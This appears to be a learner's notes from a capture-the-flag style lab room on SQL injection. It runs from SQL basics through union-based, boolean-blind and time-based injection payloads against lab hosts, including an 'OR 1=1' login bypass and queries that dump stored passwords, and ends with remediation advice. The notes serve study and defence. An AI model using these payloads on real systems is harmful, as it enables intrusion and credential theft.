SQL injection (Structured Query Language) = an attack on a web application database server that causes malicious queries to be executed

if an application communicates with a database using input from a user that hasn't been validated
an attacker can steal
- delete
- alter private and customer data
- also attack web applic authentication methods to private or customer areas

most damaging and oldest vulnerabilities
----------------------

Database = a way of electronically storing collections of data in an organised manner
Database is controlled by DBMS (Database Management system) = it falls into 2 camps
- Relational
- non-Relational
Main focus in room is Relational, common ones are  MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite.

DBMS = can have muiltiple databases, containing its own set of similar data

store the info seperatly in the database using something called tables 
------------------------------------------
tables = made up of columns and rows

each columns = referred to as field = unique name per table 
create column -> set type of data will contain = common are int,str,or dates
some contain geospatial = contain location information 
each row can have a unique num by auto increment feature enabled

rows/records = contain individual lines of data. 
when data is added to table, new row is created when delete then row remove
----------------------------------------------------
relational vs non relational database
- relational database 
	- stores info in tables, tables share info between them 
	- use columns to specify and define the data being stored and rows to store the data 
	- tables contain column that have unique id(primary key)
	- then be used in other tables to reference it and cause a relationship between the tables 
- non relational database = sometimes called NoSQl
	- are datbase that dont use tables,columns, and rows to store data
	- specific database layout doesn't need to be constructed so each row of data can contain differ info
	- give more flexibility over relational database
popular database of non relational are MongoDB, Cassandra and ElasticSearch.
----------------------------------------------
SQL = used for querying databases = referred to as statements
SQL syntax is not case sensitive 
some database servers haver their own syntax and slight changes to how things work 
EX are based on MySQL database
----------------------------------
SELECT = used to retrieve data from database

-------------------------------------------------	
select * from users;

^	^     ^    ^tell database it is end of query
^	^     ^want to retrieve data from table name users
^	^want to receive back all column from the table, EX(id,username,password)
^want to retrieve some data 
---------------------------------------------------
select username,password from users;

- similar to last but instead of "*" to return all columns
 we request username,password
----------------------------------------------------------
select * from users LIMIT 1;

- same as 1st but the Limit 1, forces the database to return only one row of data 
- changing it to Limit1,1  forces query to skip the first result
- changing it to LIMIT 2,1 skips the first two results, and so on. 
- first number tells database how many results u wish to skip and the second numb tells how many rows to return
-------------------------------------------------------------
select * from users where username='admin';

- return  rows where the username is equal to admin
-----------------------------------------------------
select * from users where username != 'admin';

 only return the rows where the username is NOT equal to admin.
--------------------------------------------------------
select * from users where username='admin' or username='jon';

- This will only return the rows where the username is either equal to admin or jon. 
-------------------------------------------------------------------------
select * from users where username='admin' and password='p4ssword';

- only return the rows where the username is equal to admin and the password is equal to p4ssword.
-----------------------------------------------------------------
select * from users where username like 'a%';

- This returns any rows with a username beginning with the letter a.
--------------------------------------------------------------------
select * from users where username like '%n';

- This returns any rows with a username ending with the letter n.
----------------------------------------------------------------
select * from users where username like '%mi%';

- This returns any rows with a username containing the characters mi within them
-------------------------------------------------------
---------------------------------------------------------
---------------------------------------------------------
UNION = combines the results of two or more SELECT statements o retrieve data from either single or multiple tables
Rules to query
- UNION statement must retrieve the same number of columns in each SELECT statement
-  the columns have to be of a similar data type
-  the column order has to be the same
----------------------------------------------
EX: 
using the following SQL Statement, we can gather the results from the two tables and put them into one result set:

SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
----------------------------------------------------------
Insert  = tells the database we wish to insert a new row of data into the table

insert into users (username,password) values ('bob','password123');

- "into users" tells the database which table we wish to insert the data into
- "(username,password)" provides the columns we are providing data for 
- "values ('bob','password');" provides the data for the previously specified columns.
----------------------------------------------------------------------
UPDATE =  tells the database we wish to update one or more rows of data within a table.

update users SET username='root',password='pass123' where username='admin';

- specify the table you wish to update using "update %tablename% SET" 
-  select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'"
- similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;"

- -------------------------------------------------------------------
DELETE = tells the database we wish to delete one or more rows of data.

delete from users where username='martin';

- Apart from missing the columns you wish to return the format of this query is very similar to the SELECT. 
- You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

delete from users;

Because if no WHERE clause was being used in the query, all the data would deleted from the table
-----------------------------------------------------------
#################################################################################################

SQL injection = The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

what does it look like 
EX:
- you've come across an online blog, and each blog entry has a unique ID number.
- The blog entries may be either set to public or private,
- The URL for each blog entry may look something like this:
	https://website.thm/blog?id=1
URL above, you can see that the blog entry selected comes from the id parameter in the query string. 
The web application needs to retrieve the article from the database and may use an SQL statement like:
---------------------------
SELECT * from blog where id=1 and private=0 LIMIT 1;

SQL Injection is introduced when user input is introduced into the database query.
 In this instance, the id parameter from the query string is used directly in the SQL query.
----------------------
if article ID 2 is still locked as private, we can call the url

https://website.thm/blog?id=2;--

Which produces the SQL statement:

SELECT * from blog where id=2;-- and private=0 LIMIT 1;
			        ^ everything after is turned to comment
			     ^end of query

which returns the article ID of 2 whether it is set to public or not

this example is called In-Band SQL injection
3  types exist
-  In-Band
-  Blind
- Out-of-Band
---------------------------------------------------
###################################################
In-Band SQL Injection
- easiest to detects and exploit 
- in-band refers to the same method of communication being used to exploit the vulnerability and also recieve the results
- EX discovering SQL injectiont on website page 
- then being able to extract data from database to the same page
--------------------------------------------------------
Error-based ...
- most useful for easily obtaining info about the database structure 
- error message from database are pinted directly to browser screen
- can be used to enumerate the database
--------------------------------------------------
Union based 
- utilises the SQL UNION operator along with SELECT to return more results to page
- common way of extracting large amount of data via SQL injection vulnerability
--------------------------------------
https://website.thm/article?id=0 union select 1,2,database()
 
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

- group_concat() gets specified column (this case table name) from multiple returned rows and puts it into one string separated by commas
- information_schema database; every user of the database has access to this, and it contains info about all the databases and tables the user has access to
- we want to list all the tables in the sqli_one database, it is article/staff_users

https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

similar to last but changed table_name to column_name
- the table we are querying in the information_schema database has changed from tables to columns
- we're searching for any rows where the table_name column has a value of staff_users.

https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

We can use the username and password columns for our following query to retrieve the user's information.
- use the group_concat method to return all of the rows into one string and make it easier to read. 
-  ,':', to split the username and password from each other. 
- Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.

and we get our flag for level one
##################################################################
Blind SQLi = when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not

Aunthentication Bypass
- more straightforward method can be a login form
- login forms that are connected to a database developed at times where applic arents interested in user and passw 
- instead it wants to match a pair
-------------------------------------------
select * from users where username='%username%' and password='%password%' LIMIT 1;

- The %username% and %password% values are taken from the login form fields. The initial values in the SQL Query box will be blank as these fields are currently empty.

make query to always return true 
- 	' OR 1=1;--

we get flag for level 2
###############################################################
Boolean Based = refer to response we recieve from our injection attempts 

- which could be T/F, Y/N, On/off, 1/0, etc... 
- this would confrirm if payload is successful or not 
- possible to enumerate a whole database structure and contents 
------------------------------------------------------
many signup forms replicates a common feature, that checks if a username has been registered to prompt the user to choose a differ username

https://website.thm/checkuser?username=admin
{"taken":true}
- since taken value is true the user name is taken
=====
we try admin123 and try to make it true 

admin123' UNION SELECT 1;-- 
- still false so add more columns
- we put 1,2,3 = we get true
- we got the columns time for enumeration part

1. find out database name 
	- use built in database() method
	- use like operator and get true status

admin123' UNION SELECT 1,2,3 where database() like '%';--

- we get true because of % = matches anything as it is a wildcard value
- a% = gives false meaning it does not start with "a",  we can cycle through all the letters
- we find it starts with "s", we keep going till find match ex: 'sa%', 'sb%' etc... 
- database name = sqli_three

2. can now use to enumerate table names using a similar method by utilising the information_schema database
 
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

- looks for results in the information_schema database in the tables table where the database name matches sqli_three
- table name begins with the letter a = false
- we find out that the name is users

3. need to enumerate the column names in the users table so we can properly search it for login credentials

- use the information_schema database and the information we've already gained to query it for column names.
-  we search the columns table where the database is equal to sqli_three
- the table name is users, and the column name begins with the letter a.

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

- when cycling through letters you need to appened them to avoid repeats by doing the above
- repeat process 3 times can discover the columns id,user, and passw
- can query users table for login credentials 
- we need to discover valid user

admin123' UNION SELECT 1,2,3 from users where username like 'a%

- we get true for user starting with "a"
- we find out its admin

admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
- we can find passw like this
- we find out it is 3845
----------------------------------
Time-based = similar to boolean based, same request are being sent, but no visual indicator of your queries being wrong or right this time

- the indicator of a correct query is based on the time the query takes
- Sleep(x) = time delay along side with union statement
- sleep() method executes when it is successful union/select statement 
-------------------------------------------------------------------------

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2;--
- no lag so unsuccessfull, we need to add more columns
- admin123' UNION SELECT SLEEP(5),2;--		= 	success

referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
-we find the database name is sqli_four

referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'a%';--
- table name = us***

referrer=admin123' UNION SELECT SLEEP(5),2 FROM users where username like 'a%
- username = ad***


referrer=admin123' UNION SELECT SLEEP(5),2 FROM users where username='admin' and password like 'a%
- password = 49**

after user and pass submitted you recieve your flag
---------------------------------------------------------

out of band is not as common = depends on features enabled on database or web applic business logic 

out of band attack is classified by having 2 communication channels 
- one to launch the attack
- the other to gather results

For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database, which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.
##################################################################################

Remediation
As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:

Prepared Statements (With Parameterized Queries):
- first thing a developer writes is the SQL query
- then any user inputs are added as parameters afterwards
- Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data

Input Validation:
- Input validation can go a long way to protecting what gets put into an SQL query
- Employing an allow list can restrict input to only certain strings
- a string replacement method in the programming language can filter the characters you wish to allow or disallow. 

Escaping User Input:
- Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or open them up for injection attacks
- Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.




